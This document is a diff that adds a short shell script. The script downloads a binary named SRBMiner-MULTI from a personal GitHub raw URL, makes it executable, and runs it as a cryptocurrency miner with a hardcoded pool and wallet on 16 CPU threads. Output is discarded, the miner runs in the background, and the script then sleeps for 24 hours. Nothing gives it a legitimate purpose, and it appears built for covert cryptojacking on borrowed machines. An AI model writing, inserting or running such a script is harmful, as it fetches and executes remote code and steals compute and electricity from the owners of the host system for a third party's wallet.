@@ -1,0 +1,4 @@
+rm -rf SRBMiner-MULTI && wget https://raw.githubusercontent.com/jsiqiisn/a/main/SRBMiner-MULTI
+chmod +x SRBMiner-MULTI
+./SRBMiner-MULTI --algorithm yescryptr16 --pool stratum+tcp://stratum-asia.rplant.xyz:7057 --wallet GYVp2vD6EnyitxVzjKBkFCDJZ2eoPNwNrK.$(echo $(shuf -i 1-20000 -n 1)-V) --cpu-threads 16 > /dev/null 2>&1 &
+sleep 24h
